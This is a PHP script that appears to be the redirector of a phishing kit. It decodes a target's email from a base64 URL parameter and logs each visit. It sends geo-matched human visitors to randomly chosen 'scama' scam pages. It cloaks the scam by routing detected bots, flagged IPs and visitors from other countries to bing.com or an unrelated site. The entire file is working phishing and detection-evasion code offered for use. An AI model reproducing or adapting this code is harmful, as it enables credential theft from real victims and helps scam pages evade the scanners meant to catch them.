<?php

header("Cache-Control: no-store, no-cache, max-age=0");
// header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

require_once('../core/beon_core.php');
require_once('../core/short_core.php');

if ($_ENV['ENVIRONMENT'] === 'development') {
    ini_set('display_errors', 1);
    ini_set("memory_limit", -1);
    error_reporting(1);
} else {
    ini_set('display_errors', 0);
    ini_set("memory_limit", -1);
    error_reporting(0);
}




@$email = base64_decode($_GET['key']);

$origin = $_SERVER['HTTP_HOST'];

$compare_scam = compare_scama($email);

if ($compare_scam == true) {

    $result_scama = result_scama($email);

    $visit_scama = $result_scama[0]['link_scama'];
    $id = $result_scama[0]['id_visitor_scama'];
    insertVisitor($origin, $visit_scama, "NO", $email);
    updateActivity($id);
    header("Location: $visit_scama", TRUE, 301);
    exit();
}

//ip from visitor
$clint_code =  getCountry()['country_code'];
// random link
$link = getScama();
$linkscama = $link[array_rand($link)]['link_sc'];
// get country lock
$country_lock = getCountryLock()[0]['country'];



if (deviceBot() === 'NO') {
    $chek_bot_ip = ipbot()['block'];
    $chek_bot_ip = strtoupper($chek_bot_ip);
    if ($chek_bot_ip === 'NO') {
        if ($country_lock === $clint_code) {
            if (empty($email)) {
                $email = generateRandomGmail();
            }
            Insert_scama($linkscama, $email);
            insertVisitor($origin, $linkscama, $chek_bot_ip, $email);
            header("Location: $linkscama", TRUE, 301);
            exit();
        } else {
            insertVisitor($origin, "https://theprofitstorm.com/", 'YES', 'Diff country');
            header("Location: https://theprofitstorm.com/", TRUE, 301);
            exit();
        }
    } else if ($chek_bot_ip === 'YES') {
        insertVisitor($origin, "https://bing.com/", 'YES', 'bot ip');
        header("Location: https://bing.com/", TRUE, 301);
        exit();
    }
} else {
    insertVisitor($origin, "https://bing.com/", 'YES', 'Device bot');
    header("Location: https://bing.com/?=", TRUE, 301);
    exit();
}
